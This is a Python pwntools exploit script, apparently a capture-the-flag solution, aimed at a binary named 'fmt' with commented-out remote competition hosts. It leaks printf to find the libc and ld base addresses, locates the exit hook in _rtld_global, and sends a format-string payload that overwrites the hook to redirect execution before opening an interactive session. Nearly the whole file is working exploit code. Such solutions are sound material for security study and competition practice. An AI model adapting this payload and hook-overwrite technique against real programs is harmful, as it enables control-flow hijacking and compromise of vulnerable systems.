from pwn import *

# io = remote("127.0.0.1", 55299)
# io = remote("192.168.170.128", 1234)
# io = remote("competition.blue-whale.me", 20631)
io = process("./fmt")
# io = remote("3.1.2.3", 8888)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./fmt')
libc = ELF('./libc-2.31.so')
ld = ELF('./ld-2.31.so')

s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda: io.recv()
ru = lambda text: io.recvuntil(text)
uu32 = lambda: u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
lg = lambda addr: log.info(addr)
ia = lambda: io.interactive()

# gdb.attach(io)
# gdb.attach(io, 'b printf')
gdb.attach(io, 'b *0x40128D')

ru(b'gift: ')
printf_addr = int(io.recv(14), 16)
lg(hex(printf_addr))
libc_base = printf_addr - libc.sym['printf']
lg(hex(libc_base))

ld_base = libc_base + 0x1f4000
exit_hook = ld_base + ld.sym['_rtld_global'] + 3848
lg("exit_hook = " + hex(exit_hook))

payload = b'%8$s\x00'.ljust(0x10, b'\x00') + p64(exit_hook) + b'\x00' * 8
s(payload)
# gdb.attach(io)
sl(p64(0x4012c2))
# sl(b'bbbbbbbb')
ia()
